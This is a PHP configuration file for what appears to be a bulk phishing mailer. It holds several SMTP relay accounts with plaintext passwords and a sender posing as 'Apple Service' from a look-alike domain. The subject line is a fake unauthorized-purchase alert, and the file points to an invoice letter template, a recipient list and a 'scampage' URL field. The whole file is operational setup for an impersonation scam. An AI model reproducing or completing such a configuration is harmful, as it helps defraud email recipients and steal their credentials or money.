<?php

//Regards
date_default_timezone_set('Asia/Jakarta');
$date = date('F d, Y, h:i A T');

/* SMTP SETUP */
$smtp_acc = [
    [
        "host"     => "smtp-relay.gmail.com",
        "port"     => "587",
        "username" => "admur@serverator.email",
        "password" => "Admur0401"
    ],
    [
        "host"     => "smtp-relay.gmail.com",
        "port"     => "587",
        "username" => "user1@serverator.email",
        "password" => "abcd1234"
    ],
    [
        "host"     => "smtp-relay.gmail.com",
        "port"     => "587",
        "username" => "user@serverator.email",
        "password" => "abcd1234"
    ],

];

/* Features SETUP */

$gx_setup = [
    "priority"       => 1,
    "userandom"      => 0,
    "sleeptime"      => 1,
    "replacement"    => 1,
    "filesend"       => 1,
    "userremoveline" => 0,
    "mail_list"      => "file/maillist/tester.txt",
    "fromname"       => "Apple Service",
    "frommail"       => "order-confirmation##randstring##noreply@supporte-services-verifcations.com",
    "subject"        => "Re : [Need Confirmation] We detected un-authorized purchase",
    "msgfile"        => "file/letter/invoice.html",
    "filepdf"        => "file/attachment/logo.ico",
    "scampage"       => ["https://hootsuite.com"],
];
